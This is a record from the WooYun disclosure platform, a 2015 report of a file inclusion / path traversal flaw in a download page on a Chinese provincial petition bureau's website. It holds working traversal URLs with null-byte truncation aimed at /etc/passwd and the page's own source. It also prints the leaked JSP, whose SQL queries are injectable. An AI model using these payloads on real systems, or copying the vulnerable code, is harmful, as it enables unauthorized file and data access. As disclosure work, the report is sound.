{"id": 40693, "wybug_id": "wooyun-2015-091036", "wybug_title": "某省信访局文件包含获取敏感信息", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "covertops", "wybug_date": "2015-01-13 11:35", "wybug_open_date": "2015-02-27 11:36", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件包含漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-27：\t细节向公众公开  简要描述：  详细说明：  山西信访局http://www.xfsx.gov.cn漏洞URL为：http://www.xfsx.gov.cn/mag/util/download.jsp?path=../../../../../../../../../../etc/passwd%00.apk,140117\n\n\n\n但是%00后面的不是已经截断了么？http://www.xfsx.gov.cn/mag/util/download.jsp?path=../../../../../../../../../../etc/passwd%00.apk包含失败\n\nhttp://www.xfsx.gov.cn/mag/util/download.jsp?path=../../../../../mag/util/download.jsp%00.apk,140117download.jsp文件内容如下：\n<%@ page contentType=\"text/html; charset=gb2312\"%><%@ page language=\"java\" import=\"java.util.*,java.io.*\"%><%@ page language=\"java\" import=\"org.genius.data.ConfigParse\" %><%@ page import=\"java.text.SimpleDateFormat\" %><%@ page import=\"com.bwzy.coke.util.ParamsKeyUtil\" %><%@ page import=\"org.springframework.context.ApplicationContext\" %><%@ page import=\"org.springframework.context.support.ClassPathXmlApplicationContext\" %><%@ page import=\"org.genius.data.IDataConfig\" %><%@ page import=\"java.sql.SQLException\" %><%@ page import=\"java.sql.ResultSet\" %><%    //¼ÇÂ¼ÇëÇó¿ªÊ¼Ê±¼ä    Date startdate=new Date();    String nowTime = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\").format(startdate);//    //¼ÇÂ¼¿Í»§¶Ë·ÃÎÊµÄurlÐÅÏ¢    String requestURL=request.getLocalAddr() + \":\" + request.getLocalPort() + request.getRequestURI() + \"?\" + request.getQueryString();    //»ñÈ¡·þÎñÀàÐÍ    String businesstype = request.getParameter(ParamsKeyUtil.URL_PARAMS_KEY_BUSINESSTYPE);    String type=request.getParameter(ParamsKeyUtil.URL_PARAMS_KEY_TYPE);\trequest.setCharacterEncoding(\"gb2312\");\tString pathFolder = new String(request.getParameter(\"path\")) ;\tString[] fileName = pathFolder.split(\",\");\tString PathHead = ConfigParse.getFilePath();\tString folderL1 = fileName[1].substring(0,2);\tString folderL2 = fileName[1].substring(2,4);\tString folderL3 = fileName[1].substring(4,6);\tString realPath = PathHead + \"/\" + folderL1 + \"/\" + folderL2 + \"/\" + folderL3 + \"/\" + fileName[0];\tString realPathFix = new String(realPath.getBytes(\"iso-8859-1\"),\"gbk\");\tFile file = null;\ttry{\t\tfile = new File(realPathFix);\t\tFileInputStream fis = new FileInputStream(file);\t\tBufferedInputStream bis = new BufferedInputStream(fis);\t\tOutputStream os = response.getOutputStream();    \tresponse.setContentType(\"application/octet-stream\");\t    response.setHeader(\"Content-disposition\", \"attachment; filename=\" \t    \t\t+ new String(file.getName().getBytes(\"GBK\"),\"iso-8859-1\"));\t\tresponse.addHeader( \"Content-Length\",\"\"   +  file.length());        ApplicationContext context = new ClassPathXmlApplicationContext(                \"applicationContext.xml\");        IDataConfig myData = (IDataConfig) context.getBean(\"dataConfigProxy\");        myData.init();         ResultSet resultSet=null;        int downnum=0;        int id=0;        boolean result=false;        try {            myData.openConnection();            myData.beginTransaction();            String sql1 =\"select id,downnum from clientmanager where download='\"+request.getParameter(\"path\")+\";'\";            System.out.println(sql1);            resultSet=myData.executeQuery(sql1);            while (resultSet.next()){                downnum= Integer.parseInt(resultSet.getString(\"downnum\"));                System.out.println(\"ÏÂÔØ´ÎÊý\"+downnum);                id=resultSet.getInt(\"id\");            }            if(downnum>=0){                downnum++;                String sql2 =\"update clientmanager set downnum='\" + downnum + \"' where id='\" + id + \"'\";                myData.addBatch(sql2);                if(myData.commit()){                    result=true;                }else{                    result=false;                }            }            System.out.println(\"ÊÇ·ñ²åÈë³É¹¦\"+result);            myData.endTransaction();        } catch (SQLException e) {            e.printStackTrace();        }finally{            myData.closeConnection();        }\t    byte[] buffer = new byte[1024];\t    try{ \t\t   \twhile(bis.read(buffer) != -1){ \t\t   \t\tos.write(buffer);\t    \t}\t\t}catch(Exception e){}\t\ttry{\t\t\tos.flush();\t\t}catch(Exception e){}\t\t\tbis.close();\t\t\tos=null;\t\ttry{ \t\t\tresponse.flushBuffer();\t\t}catch(Exception e){}        out = pageContext.pushBody();\t\tout.clear();\t}catch(Exception e){\t\tSystem.out.println(\"\\\"\"+realPathFix+\"\\\" ÎÄ¼þÏÂÔØÊ§°Ü\");\t\tresponse.getWriter().print(\"ÏÂÔØÊ§°Ü£¬Î´ÕÒµ½Ö¸¶¨×ÊÔ´.\");\t}%>\n   漏洞证明：  包含的话，信访局应该有不少上传附件的地方吧，没注册   修复方案：  对文件名进行校验   版权声明：转载请注明来源 covertops@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-01-16 16:48 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给山西分中心，由其后续尝试协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}